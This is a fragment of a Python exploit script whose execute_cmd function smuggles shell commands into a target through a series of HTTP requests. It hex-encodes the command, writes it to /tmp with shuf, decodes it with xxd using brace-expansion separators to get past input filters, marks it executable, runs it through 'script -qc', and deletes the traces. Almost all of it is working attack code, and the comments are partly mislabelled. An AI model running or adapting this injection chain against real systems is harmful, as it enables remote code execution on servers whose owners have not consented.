...
def execute_cmd(cmd, dns_root):
    ...
    tmp_file2 = '/tmp/b1235'
    tmp_file3 = '/tmp/b1236'
    #exploit = get_payload(cmd_injection_wrapper, payload_template, cmd_str, tmp_file)
    #print(exploit)

    hex_str_cmd = binascii.hexlify(cmd_str.encode()).decode()

    # Add the decode wrapper
    decode_wrapper = "shuf -e %s -o %s" % (hex_str_cmd, tmp_file)
    ...
    # Set decode command
    decode_cmd_str = "\\{xxd\\,-r\\,-p\\,%s\\}" % tmp_file

    # Command to execute decode
    decode_wrapper = "shuf -e %s -o %s" % (decode_cmd_str, tmp_file2)
    ...
    # Command to execute decode
    decode_wrapper = "chmod +x %s" % (tmp_file2)
    ...
    # Send second request to decode and save to second tmp file
    resp = make_request(url, req_verb, param_dict)
    print("[*] Sent third request")
    
    # Command to execute decode
    decode_wrapper = "script -qc %s %s" % (tmp_file2, tmp_file3)
    ...
    # Send second request to decode and save to second tmp file
    resp = make_request(url, req_verb, param_dict)
    print("[*] Sent fourth request")

    # Command to execute decode
    decode_wrapper = "chmod +x %s&%s" % (tmp_file3, tmp_file3)
    ...
    # Send second request to decode and save to second tmp file
    resp = make_request(url, req_verb, param_dict)
    print("[*] Sent fifth request")

    # # Command to execute decode
    decode_wrapper = "rm %s&rm %s&rm %s" % (tmp_file,tmp_file2,tmp_file3)
...
def get_payload(exploit_template, payload_template, cmd, tmp_file):
